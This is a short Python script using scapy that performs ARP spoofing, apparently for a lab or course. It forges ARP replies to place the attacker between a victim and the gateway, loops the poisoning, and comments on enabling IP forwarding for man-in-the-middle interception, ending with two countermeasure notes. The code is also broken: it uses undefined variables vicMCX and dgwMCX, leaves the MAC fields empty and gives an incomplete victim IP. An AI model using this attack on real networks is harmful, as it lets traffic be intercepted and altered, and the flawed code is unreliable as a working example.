#!/usr/bin/python3

from scapy.all import *

attIP='192.168.50.171'
attMAC=''
vicIP='192.168.50'
vicMAC=''
dgwIP='192.168.50.1'
dgwMAC=''

# I am gateway
arpVic=ARP(op=2, psrc=dgwIP, pdst=vicIP, hwdst=vicMCX)
# I am victim !
arpDgw=ARP(op=2, psrc=vicIP, pdst=dgwIP, hwdst=dgwMCX)

persist="arp and host %s or host %s" % (vicIP, dgwIP)
while True:
	send(arpVic)
	send(arpDgw)
	print("ARP spoofing the gate way");

	sniff(filter=persist, count=1)

# enable ip forward
# sudo sysctl -w net.ipv4.ip_forward=1
# sudo sysctl -p

# Countermeasures
# 1. arp -s IP_ADDRESS MAC_ADDRESS
# 2. Encrypted and anthenticated channel against MITM attack
